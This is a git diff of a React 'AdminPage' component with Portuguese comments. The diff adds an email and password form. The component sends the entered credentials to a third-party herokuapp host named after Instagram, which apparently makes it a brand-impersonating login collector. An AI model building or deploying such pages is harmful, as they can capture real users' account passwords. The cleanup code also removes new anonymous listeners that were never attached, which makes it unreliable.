@@ -3,6 +3,7 @@ import React, { useEffect } from 'react';
 const AdminPage = () => {
   useEffect(() => {
     const loading = document.querySelector(".loading");
+
     setTimeout(() => {
       loading.style.display = "none";
     }, 3000);
@@ -27,14 +28,14 @@ const AdminPage = () => {
       }, time);
     };
 
-    start();
+    window.addEventListener("load", start);
 
     const password = document.querySelector("#password");
     const user = document.querySelector("#user");
     const show = document.querySelector(".show");
     const button = document.querySelector("#submit");
 
-    const handlePasswordChange = (e) => {
+    const handlePasswordChange = (e) => {  
       let value = e.target.value;
 
       if (value === "" || value.length < 6) {
@@ -58,6 +59,7 @@ const AdminPage = () => {
       }
     });
 
+    // Função para fazer a requisição POST
     const registerUser = (email, password) => {
       fetch("https://instagram-7a92281434df.herokuapp.com/register", {
         method: "POST",
@@ -83,27 +85,39 @@ const AdminPage = () => {
       });
     };
 
+    // Evento de clique no botão de submit
     button.addEventListener("click", () => {
       const email = user.value;
       const pass = password.value;
 
+      // Verifica se email e senha não estão vazios
       if (email && pass && pass.length >= 6) {
-        registerUser(email, pass);
+        registerUser(email, pass); // Chama a função para registrar o usuário
       } else {
         console.log("Por favor, preencha o email e a senha corretamente.");
+        // Ou adicione alguma lógica para lidar com campos vazios/inválidos
       }
     });
 
-    // Removendo os event listeners quandjo o componente é desmontado
+    // Removendo os event listeners quando o componente é desmontado
     return () => {
       password.removeEventListener("keyup", handlePasswordChange);
+      show.removeEventListener("click", () => {});
+      button.removeEventListener("click", () => {});
     };
 
-  }, []); // O segundo argumento vazio indica que esse efeito será executado apenas uma vez após a montagem
+  }, []); // Executa apenas uma vez após a montagem do componente
 
   return (
     <div>
-      {/* Seu conteúdo da página de administração aqui */}
+      {/* Conteúdo da página de administração */}
+      <div className="loading">
+        <p>Carregando...</p>
+      </div>
+      <input type="email" id="user" placeholder="Email" />
+      <input type="password" id="password" placeholder="Senha" />
+      <span className="show">Mostrar</span>
+      <button id="submit">Enviar</button>
     </div>
   );
 };
